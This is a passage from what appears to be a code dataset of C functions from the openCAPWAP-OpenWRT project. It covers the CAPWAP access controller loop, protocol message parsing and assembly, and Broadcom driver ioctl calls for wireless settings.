(CWACSendAcknowledgedPacket\n\t\t\t\t\t\t\t    (i, CW_MSG_TYPE_VALUE_CONFIGURE_UPDATE_RESPONSE, seqNum))\n\t\t\t\t\t\t\t\tbResult = CW_TRUE;\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tCWACStopRetransmission(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tcase CLEAR_CONFIG_MSG_CMD:{\n\t\t\t\t\t\tint seqNum = CWGetSeqNum();\n\n\t\t\t\t\t\t/* Clear Configuration Request */\n\t\t\t\t\t\tif (CWAssembleClearConfigurationRequest(&(gWTPs[i].messages),\n\t\t\t\t\t\t\t\t\t\t\t&(gWTPs[i].messagesCount),\n\t\t\t\t\t\t\t\t\t\t\tgWTPs[i].pathMTU, seqNum)) {\n\n\t\t\t\t\t\t\tif (CWACSendAcknowledgedPacket\n\t\t\t\t\t\t\t    (i, CW_MSG_TYPE_VALUE_CLEAR_CONFIGURATION_RESPONSE, seqNum))\n\t\t\t\t\t\t\t\tbResult = CW_TRUE;\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tCWACStopRetransmission(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t/********************************************************\n\t\t\t\t * 2009 Update:                                         *\n\t\t\t\t *              New switch case for OFDM_CONTROL_CMD    *\n\t\t\t\t ********************************************************/\n\n\t\t\t\tcase OFDM_CONTROL_CMD:{\n\t\t\t\t\t\tint seqNum = CWGetSeqNum();\n\n\t\t\t\t\t\tif (CWAssembleConfigurationUpdateRequest(&(gWTPs[i].messages),\n\t\t\t\t\t\t\t\t\t\t\t &(gWTPs[i].messagesCount),\n\t\t\t\t\t\t\t\t\t\t\t gWTPs[i].pathMTU,\n\t\t\t\t\t\t\t\t\t\t\t seqNum,\n\t\t\t\t\t\t\t\t\t\t\t CONFIG_UPDATE_REQ_OFDM_ELEMENT_TYPE))\n\t\t\t\t\t\t{\n\n\t\t\t\t\t\t\tif (CWACSendAcknowledgedPacket\n\t\t\t\t\t\t\t    (i, CW_MSG_TYPE_VALUE_CONFIGURE_UPDATE_RESPONSE, seqNum))\n\t\t\t\t\t\t\t\tbResult = CW_TRUE;\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tCWACStopRetransmission(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\t/*Update 2009\n\t\t\t\t\t   Added case to manage UCI configuration command */\n\t\t\t\tcase UCI_CONTROL_CMD:{\n\t\t\t\t\t\tint seqNum = CWGetSeqNum();\n\n\t\t\t\t\t\tif (CWAssembleConfigurationUpdateRequest(&(gWTPs[i].messages),\n\t\t\t\t\t\t\t\t\t\t\t &(gWTPs[i].messagesCount),\n\t\t\t\t\t\t\t\t\t\t\t gWTPs[i].pathMTU,\n\t\t\t\t\t\t\t\t\t\t\t seqNum,\n\t\t\t\t\t\t\t\t\t\t\t CONFIG_UPDATE_REQ_VENDOR_UCI_ELEMENT_TYPE))\n\t\t\t\t\t\t{\n\n\t\t\t\t\t\t\tif (CWACSendAcknowledgedPacket\n\t\t\t\t\t\t\t    (i, CW_MSG_TYPE_VALUE_CONFIGURE_UPDATE_RESPONSE, seqNum))\n\t\t\t\t\t\t\t\tbResult = CW_TRUE;\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tCWACStopRetransmission(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tcase WTP_UPDATE_CMD:{\n\t\t\t\t\t\tint seqNum = CWGetSeqNum();\n\n\t\t\t\t\t\tif (CWAssembleConfigurationUpdateRequest(&(gWTPs[i].messages),\n\t\t\t\t\t\t\t\t\t\t\t &(gWTPs[i].messagesCount),\n\t\t\t\t\t\t\t\t\t\t\t gWTPs[i].pathMTU,\n\t\t\t\t\t\t\t\t\t\t\t seqNum,\n\t\t\t\t\t\t\t\t\t\t\t CONFIG_UPDATE_REQ_VENDOR_WUM_ELEMENT_TYPE))\n\t\t\t\t\t\t{\n\n\t\t\t\t\t\t\tif (CWACSendAcknowledgedPacket\n\t\t\t\t\t\t\t    (i, CW_MSG_TYPE_VALUE_CONFIGURE_UPDATE_RESPONSE, seqNum))\n\t\t\t\t\t\t\t\tbResult = CW_TRUE;\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tCWACStopRetransmission(i);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tgWTPs[i].interfaceCommand = NO_CMD;\n\n\t\t\t\tif (bResult)\n\t\t\t\t\tgWTPs[i].interfaceCommandProgress = CW_TRUE;\n\t\t\t\telse {\n\t\t\t\t\tgWTPs[i].interfaceResult = 0;\n\t\t\t\t\tCWSignalThreadCondition(&gWTPs[i].interfaceComplete);\n\t\t\t\t\tCWDebugLog(\"Error sending command\");\n\t\t\t\t}\n\t\t\t}\n\t\t\tCWThreadMutexUnlock(&gWTPs[i].interfaceMutex);\n\t\t}\n\t\tCWThreadSetSignals(SIG_UNBLOCK, 2, CW_SOFT_TIMER_EXPIRED_SIGNAL, CW_CRITICAL_TIMER_EXPIRED_SIGNAL);\n\t}\n}", "path": "ACMainLoop.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*--------------------------- RTS/CTS Threshold ---------------------------*/\n", "func_signal": "int set_rts_threshold(int value)", "code": "{\n\tchar *iov_type;\n\n\tiov_type = malloc(20 * sizeof(char));\n\tstrcpy(iov_type, \"rtsthresh\");\n\n\tif (wl_iovar_setint(interface, iov_type, value) < 0) {\n\t\tperror(\"Ioctl error\");\n\t\treturn (0);\n\t}\n\n\tprintf(\"\\nRTS/CTS threshold impostato a: %d\\n\", value);\n\treturn 1;\n}", "path": "WTPBcmDriverInteraction.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*--------------------------- Fragmentation Threshold ---------------------------*/\n", "func_signal": "int set_frag_threshold(int value)", "code": "{\n\tchar *iov_type;\n\n\tiov_type = malloc(20 * sizeof(char));\n\tstrcpy(iov_type, \"fragthresh\");\n\n\tif (wl_iovar_setint(interface, iov_type, value) < 0) {\n\t\tperror(\"Ioctl error\");\n\t\treturn (0);\n\t}\n\n\tprintf(\"\\nFragmentation threshold impostato a: %d\\n\", value);\n\treturn 1;\n}", "path": "WTPBcmDriverInteraction.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*set AIFSN*/\n", "func_signal": "int set_wme_aifsn(int class, int value)", "code": "{\n\tedcf_acparam_t params[AC_COUNT];\n\tchar *buf = wlbuf;\n\tchar *type;\n\n\ttype = malloc(20 * sizeof(char));\n\tstrcpy(type, \"wme_ac_ap\");\n\n\tmemset(params, 0, sizeof(params));\n\twl_iovar_get(interface, type, params, sizeof(params));\n\n\tstrcpy(buf, type);\n\tbuf += strlen(buf) + 1;\n\n\tparams[class].ACI = (params[class].ACI & ~(0xf)) | (value & 0xf);\n\tmemcpy(buf, &params[class], sizeof(edcf_acparam_t));\n\n\tif (wl_ioctl(interface, WLC_SET_VAR, wlbuf, BUFSIZE) < 0) {\n\t\tperror(\"Ioctl error\");\n\t\treturn (0);\n\t}\n\n\tprintf(\"\\nAIFSN impostato a: %d\\n\", value);\n\treturn 1;\n}", "path": "WTPBcmDriverInteraction.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*______________________________________________________________*/\n/*  *******************___SAVE FUNCTIONS___*******************  */\n", "func_signal": "CWBool CWSaveWTPEventResponseMessage(void *WTPEventResp)", "code": "{\n\n\tCWDebugLog(\"Saving WTP Event Response...\");\n\tCWDebugLog(\"WTP Response Saved\");\n\treturn CW_TRUE;\n}", "path": "WTPRunState.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/* Le informazioni sui Radio ID vengono prese dalle informazioni del Configure Message\n   Provvisoriamente l'error Report Period \u00e8 settato allo stesso valore per tutte le radio del WTP*/\n", "func_signal": "CWBool CWAssembleMsgElemDecryptErrorReportPeriod(CWProtocolMessage * msgPtr)", "code": "{\n\tconst int radio_Decrypt_Error_Report_Period_Length = 3;\n\tconst int reportInterval = 15;\n\tCWProtocolMessage *msgs;\n\tCWRadioAdminInfoValues *radiosInfoPtr;\n\tint radioCount = 0;\n\tint *iPtr;\n\tint len = 0;\n\tint i;\n\tint j;\n\n\tif (msgPtr == NULL)\n\t\treturn CWErrorRaise(CW_ERROR_WRONG_ARG, NULL);\n\n\tif ((iPtr = ((int *)CWThreadGetSpecific(&gIndexSpecific))) == NULL) {\n\t\tCWLog(\"Critical Error... closing thread\");\n\t\tCWCloseThread();\n\t}\n\n\tradiosInfoPtr = gWTPs[*iPtr].WTPProtocolManager.radioAdminInfo.radios;\n\tradioCount = gWTPs[*iPtr].WTPProtocolManager.radioAdminInfo.radiosCount;\n\n\tCW_CREATE_PROTOCOL_MSG_ARRAY_ERR(msgs, radioCount, return CWErrorRaise(CW_ERROR_OUT_OF_MEMORY, NULL);\n\t    );\n\n\tfor (i = 0; i < radioCount; i++) {\n\t\t// create message\n\t\tCW_CREATE_PROTOCOL_MESSAGE(msgs[i], radio_Decrypt_Error_Report_Period_Length,\n\t\t\t\t\t   return CWErrorRaise(CW_ERROR_OUT_OF_MEMORY, NULL);\n\t\t    );\n\t\tCWProtocolStore8(&(msgs[i]), radiosInfoPtr[i].ID);\t// ID of the radio\n\t\tCWProtocolStore16(&(msgs[i]), reportInterval);\t// state of the radio\n\n\t\tif (!(CWAssembleMsgElem(&(msgs[i]), CW_MSG_ELEMENT_CW_DECRYPT_ER_REPORT_PERIOD_CW_TYPE))) {\n\t\t\tfor (j = i; j >= 0; j--) {\n\t\t\t\tCW_FREE_PROTOCOL_MESSAGE(msgs[j]);\n\t\t\t}\n\t\t\tCW_FREE_OBJECT(msgs);\n\t\t\treturn CW_FALSE;\n\t\t}\n\n\t\tlen += msgs[i].offset;\n//      CWDebugLog(\"Decrypt Error Report Period: %d - %d\", radiosInfoPtr[i].ID, reportInterval);\n\t}\n\n\tCW_CREATE_PROTOCOL_MESSAGE(*msgPtr, len, return CWErrorRaise(CW_ERROR_OUT_OF_MEMORY, NULL);\n\t    );\n\n\tfor (i = 0; i < radioCount; i++) {\n\t\tCWProtocolStoreMessage(msgPtr, &(msgs[i]));\n\t\tCW_FREE_PROTOCOL_MESSAGE(msgs[i]);\n\t}\n\n\tCW_FREE_OBJECT(msgs);\n\n\treturn CW_TRUE;\n}", "path": "ACProtocol.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*set CWMAX*/\n", "func_signal": "int set_wme_cwmax(int class, int value)", "code": "{\n\tedcf_acparam_t params[AC_COUNT];\n\tchar *buf = wlbuf;\n\tchar *type;\n\n\ttype = malloc(20 * sizeof(char));\n\tstrcpy(type, \"wme_ac_ap\");\n\n\tmemset(params, 0, sizeof(params));\n\twl_iovar_get(interface, type, params, sizeof(params));\n\n\tstrcpy(buf, type);\n\tbuf += strlen(buf) + 1;\n\n\tparams[class].ECW = (params[class].ECW & ~(0xf << 4)) | ((value & 0xf) << 4);\n\tmemcpy(buf, &params[class], sizeof(edcf_acparam_t));\n\n\tif (wl_ioctl(interface, WLC_SET_VAR, wlbuf, BUFSIZE) < 0) {\n\t\tperror(\"Ioctl error\");\n\t\treturn (0);\n\t}\n\n\tprintf(\"\\nCWMAX impostato a: %d\\n\", value);\n\treturn 1;\n}", "path": "WTPBcmDriverInteraction.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/* Il WTP ha la funzione ridefinita */\n", "func_signal": "CWBool CWGetWTPRadiosAdminState(CWRadiosAdminInfo * valPtr)", "code": "{\n\tint *WTPIndexPtr;\n\n\tif (valPtr == NULL)\n\t\treturn CWErrorRaise(CW_ERROR_WRONG_ARG, NULL);\n\n\tif ((WTPIndexPtr = ((int *)CWThreadGetSpecific(&gIndexSpecific))) == NULL) {\n\t\treturn CW_FALSE;\n\t}\n\n\tvalPtr->radiosCount = gWTPs[*WTPIndexPtr].WTPProtocolManager.radiosInfo.radioCount;\n\n\tCW_CREATE_ARRAY_ERR(valPtr->radios, valPtr->radiosCount, CWRadioAdminInfoValues,\n\t\t\t    return CWErrorRaise(CW_ERROR_OUT_OF_MEMORY, NULL);\n\t    );\n\n\tint i;\n\tfor (i = 0; i < valPtr->radiosCount; i++) {\n\t\t(valPtr->radios)[i].ID = gWTPs[*WTPIndexPtr].WTPProtocolManager.radiosInfo.radiosInfo[i].radioID;\n\t\t(valPtr->radios)[i].state = gWTPs[*WTPIndexPtr].WTPProtocolManager.radiosInfo.radiosInfo[i].adminState;\n\t\t(valPtr->radios)[i].cause = gWTPs[*WTPIndexPtr].WTPProtocolManager.radiosInfo.radiosInfo[i].adminCause;\n\t}\n\n\treturn CW_TRUE;\n}", "path": "ACProtocol_User.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*Update 2009:\n    Save a vendor message (mainly UCI configuration messages)*/\n", "func_signal": "CWBool CWSaveVendorMessage(void *protocolValuesPtr, CWProtocolResultCode * resultCode)", "code": "{\n\tif (protocolValuesPtr == NULL) {\n\t\treturn CWErrorRaise(CW_ERROR_WRONG_ARG, NULL);\n\t}\n\t*resultCode = CW_PROTOCOL_SUCCESS;\n\n\tCWProtocolVendorSpecificValues *vendorPtr = (CWProtocolVendorSpecificValues *) protocolValuesPtr;\n\n\t/*Find out which custom vendor paylod really is... */\n\tswitch (vendorPtr->vendorPayloadType) {\n\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_UCI:\n\t\tif (!CWWTPSaveUCIValues((CWVendorUciValues *) (vendorPtr->payload), resultCode)) {\n\t\t\tCW_FREE_OBJECT(((CWVendorUciValues *) vendorPtr->payload)->commandArgs);\n\t\t\tCW_FREE_OBJECT(vendorPtr->payload);\n\t\t\tCW_FREE_OBJECT(vendorPtr);\n\t\t\treturn CW_FALSE;\n\t\t}\n\t\tbreak;\n\n\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_WUM:\n\t\tif (!CWWTPSaveWUMValues((CWVendorWumValues *) (vendorPtr->payload), resultCode)) {\n\t\t\tCW_FREE_OBJECT(vendorPtr->payload);\n\t\t\tCW_FREE_OBJECT(vendorPtr);\n\t\t\treturn CW_FALSE;\n\t\t}\n\t\tbreak;\n\t}\n\n\treturn CW_TRUE;\n}", "path": "WTPRunState.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*_________________________________________________________________________*/\n/*  *****************************___PARSE___*****************************  */\n", "func_signal": "CWBool CWParseACNameWithIndex(CWProtocolMessage * msgPtr, int len, CWACNameWithIndexValues * valPtr)", "code": "{\n\tCWParseMessageElementStart();\n\n\tvalPtr->index = CWProtocolRetrieve8(msgPtr);\n\t//CWDebugLog(\"CW_MSG_ELEMENT_WTP_RADIO_ID: %d\", (valPtr->radios)[radioIndex].ID);\n\n\tvalPtr->ACName = CWProtocolRetrieveStr(msgPtr, len - 1);\n\t//CWDebugLog(\"CW_MSG_ELEMENT_WTP_RADIO_TYPE: %d\",   (valPtr->radios)[radioIndex].type);\n\n\t//CWDebugLog(\"AC Name with index: %d - %s\", valPtr->index, valPtr->ACName);\n\n\tCWParseMessageElementEnd();\n}", "path": "ACProtocol.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*\n * This callback function is called when there is something to read in a\n * CWMultiHomedSocket (see ACMultiHomed.c).\n *\n * Params: sock,    is the socket that can receive the packet and it can be\n *          used to reply.\n *     buf,     (array of len chars) contains the packet which is ready\n *          on the socket's queue (obtained with MSG_PEEK).\n *     incomingInterfaceIndex,  is the index (different from the system\n *                  index, see ACMultiHomed.c) of the interface\n *                  the packet was sent to, in the array returned\n *                  by CWNetworkGetInterfaceAddresses. If the\n *                  packet was sent to a broadcast/multicast address,\n *                  incomingInterfaceIndex is -1.\n */\n", "func_signal": "void CWACManageIncomingPacket(CWSocket sock,\n\t\t\t      unsigned char *buf,\n\t\t\t      int readBytes,\n\t\t\t      int incomingInterfaceIndex, CWNetworkLev4Address * addrPtr, CWBool dataFlag)", "code": "{\n\n\tint WTPIndex = 0;\n\tchar *pData;\n\n\t/* check if sender address is known */\n\tWTPIndex = CWWTPByAddress(addrPtr, sock);\n\n\tif (WTPIndex >= 0) {\n\t\t/* known WTP */\n\t\t/* Clone data packet */\n\t\tCW_CREATE_OBJECT_SIZE_ERR(pData, readBytes, {\n\t\t\t\t\t  CWLog(\"Out Of Memory\");\n\t\t\t\t\t  return;\n\t\t\t\t\t  }\n\t\t);\n\t\tmemcpy(pData, buf, readBytes);\n\n\t\tCWLockSafeList(gWTPs[WTPIndex].packetReceiveList);\n\t\tCWAddElementToSafeListTailwitDataFlag(gWTPs[WTPIndex].packetReceiveList, pData, readBytes, dataFlag);\n\t\tCWUnlockSafeList(gWTPs[WTPIndex].packetReceiveList);\n\t\tif (dataFlag)\n\t\t\tCW_COPY_NET_ADDR_PTR(&(gWTPs[WTPIndex].dataAddress), addrPtr);\n\n\t\t\t\n\t} else {\n\t\t/* unknown WTP */\n\t\tint seqNum;\n\t\tCWDiscoveryRequestValues values;\n\n\t\tif (!CWErr(CWThreadMutexLock(&gActiveWTPsMutex)))\n\t\t\texit(1);\n\n\t\tCWThreadMutexUnlock(&gActiveWTPsMutex);\n\n\t\tif (gActiveWTPs >= gMaxWTPs) {\n\n\t\t\tCWLog(\"Too many WTPs\");\n\t\t\treturn;\n\t\t}\n\t\tCWLog(\"\\n\");\n\n\t\tif (CWErr(CWParseDiscoveryRequestMessage(buf, readBytes, &seqNum, &values))) {\n\n\t\t\tCWProtocolMessage *msgPtr;\n\n\t\t\tCWLog(\"\\n\");\n\t\t\tCWLog(\"######### Discovery State #########\");\n\n\t\t\tCWUseSockNtop(addrPtr, CWLog(\"CAPWAP Discovery Request from %s\", str);\n\t\t\t    );\n\n\t\t\t/* don't add this WTP to our list to minimize DoS\n\t\t\t * attacks (will be added after join)\n\t\t\t */\n\n\t\t\t/* destroy useless values */\n\t\t\tCWDestroyDiscoveryRequestValues(&values);\n\n\t\t\t/* send response to WTP\n\t\t\t * note: we can consider reassembling only changed part\n\t\t\t * AND/OR do this in a new thread.\n\t\t\t */\n\t\t\tif (!CWErr(CWAssembleDiscoveryResponse(&msgPtr, seqNum))) {\n\t\t\t\t/*\n\t\t\t\t * note: maybe an out-of-memory memory error\n\t\t\t\t * can be resolved without exit()-ing by\n\t\t\t\t * killing some thread or doing other funky\n\t\t\t\t * things.\n\t\t\t\t */\n\t\t\t\tCWLog(\"Critical Error Assembling Discovery Response\");\n\t\t\t\texit(1);\n\t\t\t}\n\n\t\t\tif (!CWErr(CWNetworkSendUnsafeUnconnected(sock, addrPtr, (*msgPtr).msg, (*msgPtr).offset))) {\n\n\t\t\t\tCWLog(\"Critical Error Sending Discovery Response\");\n\t\t\t\texit(1);\n\t\t\t}\n\n\t\t\tCW_FREE_PROTOCOL_MESSAGE(*msgPtr);\n\t\t\tCW_FREE_OBJECT(msgPtr);\n\t\t} else {\n\t\t\t/* this isn't a Discovery Request */\n\t\t\tint i;\n\t\t\tCWACThreadArg *argPtr;\n\n\t\t\tCWUseSockNtop(addrPtr, CWDebugLog(\"Possible Client Hello from %s\", str);\n\t\t\t    );\n\n\t\t\tif (!CWErr(CWThreadMutexLock(&gWTPsMutex)))\n\t\t\t\texit(1);\n\t\t\t/* look for the first free slot */\n\t\t\tfor (i = 0; i < gMaxWTPs && gWTPs[i].isNotFree; i++) ;\n\n\t\t\tCW_COPY_NET_ADDR_PTR(&(gWTPs[i].address), addrPtr);\n\t                if (dataFlag)\n                        CW_COPY_NET_ADDR_PTR(&(gWTPs[i].dataAddress), addrPtr);\n\n\t\t\tgWTPs[i].isNotFree = CW_TRUE;\n\t\t\tgWTPs[i].isRequestClose = CW_FALSE;\n\t\t\tCWThreadMutexUnlock(&gWTPsMutex);\n\n\t\t\t/* Capwap receive packets list */\n\t\t\tif (!CWErr(CWCreateSafeList(&gWTPs[i].packetReceiveList))) {\n\n\t\t\t\tif (!CWErr(CWThreadMutexLock(&gWTPsMutex)))\n\t\t\t\t\texit(1);\n\t\t\t\tgWTPs[i].isNotFree = CW_FALSE;\n\t\t\t\tCWThreadMutexUnlock(&gWTPsMutex);\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\tCWSetMutexSafeList(gWTPs[i].packetReceiveList, &gWTPs[i].interfaceMutex);\n\t\t\tCWSetConditionSafeList(gWTPs[i].packetReceiveList, &gWTPs[i].interfaceWait);\n\n\t\t\tCW_CREATE_OBJECT_ERR(argPtr, CWACThreadArg, {\n\t\t\t\t\t     CWLog(\"Out Of Memory\");\n\t\t\t\t\t     return;\n\t\t\t\t\t     }\n\t\t\t);\n\n\t\t\targPtr->index = i;\n\t\t\targPtr->sock = sock;\n\t\t\targPtr->interfaceIndex = incomingInterfaceIndex;\n\n\t\t\t/*\n\t\t\t * If the packet was addressed to a broadcast address,\n\t\t\t * just choose an interface we like (note: we can consider\n\t\t\t * a bit load balancing instead of hard-coding 0-indexed\n\t\t\t * interface). Btw, Join Request should not really be\n\t\t\t * accepted if addressed to a broadcast address, so we\n\t\t\t * could simply discard the packet and go on.\n\t\t\t * If you leave this code, the WTP Count will increase\n\t\t\t * for the interface we hard-code here, even if it is not\n\t\t\t * necessary the interface we use to send packets to that\n\t\t\t * WTP. If we really want to accept Join Request from\n\t\t\t * broadcast address, we can consider asking to the kernel\n\t\t\t * which interface will be used to send the packet to a\n\t\t\t * specific address (if it remains the same) and than\n\t\t\t * increment WTPCount for that interface instead of 0-indexed one.\n\t\t\t */\n\t\t\tif (argPtr->interfaceIndex < 0)\n\t\t\t\targPtr->interfaceIndex = 0;\n\n\t\t\t/* create the thread that will manage this WTP */\n\t\t\tif (!CWErr(CWCreateThread(&(gWTPs[i].thread), CWManageWTP, argPtr))) {\n\n\t\t\t\tCW_FREE_OBJECT(argPtr);\n\t\t\t\tif (!CWErr(CWThreadMutexLock(&gWTPsMutex)))\n\t\t\t\t\texit(1);\n\n\t\t\t\tCWDestroySafeList(&gWTPs[i].packetReceiveList);\n\t\t\t\tgWTPs[i].isNotFree = CW_FALSE;\n\t\t\t\tCWThreadMutexUnlock(&gWTPsMutex);\n\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\t/* Clone data packet */\n\t\t\tCW_CREATE_OBJECT_SIZE_ERR(pData, readBytes, {\n\t\t\t\t\t\t  CWLog(\"Out Of Memory\");\n\t\t\t\t\t\t  return;\n\t\t\t\t\t\t  }\n\t\t\t);\n\t\t\tmemcpy(pData, buf, readBytes);\n\n\t\t\tCWLockSafeList(gWTPs[i].packetReceiveList);\n\t\t\tCWAddElementToSafeListTailwitDataFlag(gWTPs[i].packetReceiveList, pData, readBytes, dataFlag);\n\t\t\tCWUnlockSafeList(gWTPs[i].packetReceiveList);\n\t\t}\n\t}\n}", "path": "ACMainLoop.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*_______________________________________________________________*/\n/*  *******************___PARSE FUNCTIONS___*******************  */\n/*Update 2009:\n    Function that parses vendor payload,\n    filling in valuesPtr*/\n", "func_signal": "CWBool CWParseVendorMessage(unsigned char *msg, int len, void **valuesPtr)", "code": "{\n\tCWProtocolMessage completeMsg;\n\tunsigned short int GlobalElemType = 0;\t// = CWProtocolRetrieve32(&completeMsg);\n\n\tif (msg == NULL || valuesPtr == NULL)\n\t\treturn CWErrorRaise(CW_ERROR_WRONG_ARG, NULL);\n\n\tCWLog(\"Parsing Vendor Specific Message...\");\n\n\tcompleteMsg.msg = msg;\n\tcompleteMsg.offset = 0;\n\n\tCWProtocolVendorSpecificValues *vendPtr;\n\n\t// parse message elements\n\twhile (completeMsg.offset < len) {\n\t\tunsigned short int elemType = 0;\t// = CWProtocolRetrieve32(&completeMsg);\n\t\tunsigned short int elemLen = 0;\t// = CWProtocolRetrieve16(&completeMsg);\n\n\t\tCWParseFormatMsgElem(&completeMsg, &elemType, &elemLen);\n\n\t\tGlobalElemType = elemType;\n\n\t\t//CWDebugLog(\"Parsing Message Element: %u, elemLen: %u\", elemType, elemLen);\n\n\t\tswitch (elemType) {\n\t\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_CW_TYPE:\n\t\t\tcompleteMsg.offset += elemLen;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tif (elemType == CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_CW_TYPE) {\n\t\t\t\tCW_FREE_OBJECT(valuesPtr);\n\t\t\t\treturn CWErrorRaise(CW_ERROR_INVALID_FORMAT, \"Unrecognized Message Element\");\n\t\t\t} else {\n\t\t\t\tcompleteMsg.offset += elemLen;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (completeMsg.offset != len)\n\t\treturn CWErrorRaise(CW_ERROR_INVALID_FORMAT, \"Garbage at the End of the Message\");\n\n\tswitch (GlobalElemType) {\n\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_CW_TYPE:\n\t\tCW_CREATE_OBJECT_ERR(vendPtr, CWProtocolVendorSpecificValues,\n\t\t\t\t     return CWErrorRaise(CW_ERROR_OUT_OF_MEMORY, NULL);\n\t\t    );\n\t\t/*Allocate various other vendor specific fields */\n\t\tbreak;\n\tdefault:\n\t\tvendPtr = NULL;\n\t\tbreak;\n\t}\n\n\tcompleteMsg.offset = 0;\n\twhile (completeMsg.offset < len) {\n\t\tunsigned short int type = 0;\n\t\tunsigned short int elemLen = 0;\n\n\t\tCWParseFormatMsgElem(&completeMsg, &type, &elemLen);\n\n\t\tswitch (type) {\n\t\t\t/*Once we know it is a vendor specific payload... */\n\t\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_CW_TYPE:{\n\t\t\t\tif (!\n\t\t\t\t    (CWParseVendorPayload\n\t\t\t\t     (&completeMsg, elemLen, (CWProtocolVendorSpecificValues *) vendPtr))) {\n\t\t\t\t\tCW_FREE_OBJECT(vendPtr);\n\t\t\t\t\treturn CW_FALSE;\t// will be handled by the caller\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcompleteMsg.offset += elemLen;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t*valuesPtr = (void *)vendPtr;\n\tCWLog(\"Vendor Message Parsed\");\n\n\treturn CW_TRUE;\n}", "path": "WTPRunState.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*\n * Manage DTLS packets.\n */\n", "func_signal": "CW_THREAD_RETURN_TYPE CWWTPReceiveDtlsPacket(void *arg)", "code": "{\n\n\tint readBytes;\n\tunsigned char buf[CW_BUFFER_SIZE];\n\tCWSocket sockDTLS = (long) arg;\n\tCWNetworkLev4Address addr;\n\tchar *pData;\n\n\tCW_REPEAT_FOREVER {\n\t\tif (!CWErr(CWNetworkReceiveUnsafe(sockDTLS, buf, CW_BUFFER_SIZE - 1, 0, &addr, &readBytes))) {\n\n\t\t\tif (CWErrorGetLastErrorCode() == CW_ERROR_INTERRUPTED)\n\t\t\t\tcontinue;\n\n\t\t\tbreak;\n\t\t}\n\n\t\t/* Clone data packet */\n\t\tCW_CREATE_OBJECT_SIZE_ERR(pData, readBytes, {\n\t\t\t\t\t  CWLog(\"Out Of Memory\");\n\t\t\t\t\t  return NULL;\n\t\t\t\t\t  }\n\t\t);\n\t\tmemcpy(pData, buf, readBytes);\n\n\t\tCWLockSafeList(gPacketReceiveList);\n\t\tCWAddElementToSafeListTailwitDataFlag(gPacketReceiveList, pData, readBytes, CW_FALSE);\n\t\tCWUnlockSafeList(gPacketReceiveList);\n\t}\n\n\treturn NULL;\n}", "path": "WTPRunState.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*@@@@@@@@ ioctl driver interaction's functions @@@@@@@@@@@@@*/\n", "func_signal": "int wl_ioctl(char *name, int cmd, void *buf, int len)", "code": "{\n\tstruct ifreq ifr;\n\twl_ioctl_t ioc;\n\tint ret = 0;\n\tint s;\n\n\t/* open socket to kernel */\n\tif ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {\n\t\tperror(\"socket\");\n\t\treturn errno;\n\t}\n\n\t/* do it */\n\tioc.cmd = cmd;\n\tioc.buf = buf;\n\tioc.len = len;\n\tstrncpy(ifr.ifr_name, name, IFNAMSIZ);\n\tifr.ifr_data = (caddr_t) & ioc;\n\tif ((ret = ioctl(s, SIOCDEVPRIVATE, &ifr)) < 0) {\n\t\tperror(\"ioctl error\");\n\t\tclose(s);\n\t\treturn -1;\n\t}\n\n\t/* cleanup */\n\tclose(s);\n\treturn ret;\n}", "path": "WTPBcmDriverInteraction.c", "repo_name": 